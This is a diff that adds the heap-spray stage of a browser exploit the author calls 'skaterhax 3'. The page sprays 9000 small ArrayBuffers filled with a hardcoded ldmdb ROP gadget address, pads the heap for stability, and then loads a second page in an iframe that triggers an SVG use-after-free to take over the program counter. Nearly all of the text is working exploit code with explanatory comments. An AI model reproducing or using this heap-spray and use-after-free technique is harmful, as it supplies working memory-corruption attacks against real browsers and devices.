@@ -1,0 +1,38 @@
+<!DOCTYPE html> <!-- This page is spraying 8 byte objects that will eventually override PC when the svg glitch on the next page triggers. 9000 writes of this object seems to help trigger the garbage collection that facilitates the UAF. The gadgets sprayed are an ldmdb r0 that overwrites more registers by virtue of us eventually controlling data behind r0-->
+<script>
+
+	//var obj= new ArrayBuffer(size); 
+	//var payload=  new Uint32Array(obj);
+
+function ob(size, gadget){
+
+	obj= new ArrayBuffer(size); //actual creation of UAF object, instantiated 9000 times by spray4(iter).
+	payload=  new Uint32Array(obj);
+	payload[0]=gadget;
+	payload[1]=gadget;
+}
+
+function spray4(iter) {	
+	var x=0;
+	for(var i=0; i < iter; i++){
+		x = (i*2) % 366;
+		ob(0x8, 0x00202f74); //this is our ldmdb gadget repeated twice for our 8 byte PC takeover object.
+	}
+}
+spray4(9000);	
+
+var s=1*0x100000;         //these particular 4 lines seem to stabilize the PC takeover chances by just taking up a bunch of heap space. Blind experimentation pays off sometimes.
+var obj2= new ArrayBuffer(s); 
+var payload2=  new Uint32Array(obj2);
+for(var i=0; i<s/4; i++) payload2[i]=i;
+
+function go(){
+	var f=document.getElementById("frm");
+	f.src="frame_sk3.html";  //calling the final exploit page that has the UAF triggering svg glitch. it will load inside an iframe.
+	                         //sk3 just stands for skaterhax 3, because this is the 3rd time I've exploited skater.
+}	
+</script>
+
+<body onload="go()">
+	<iframe id="frm" width="800" height="600" src=""></iframe>
+</body>
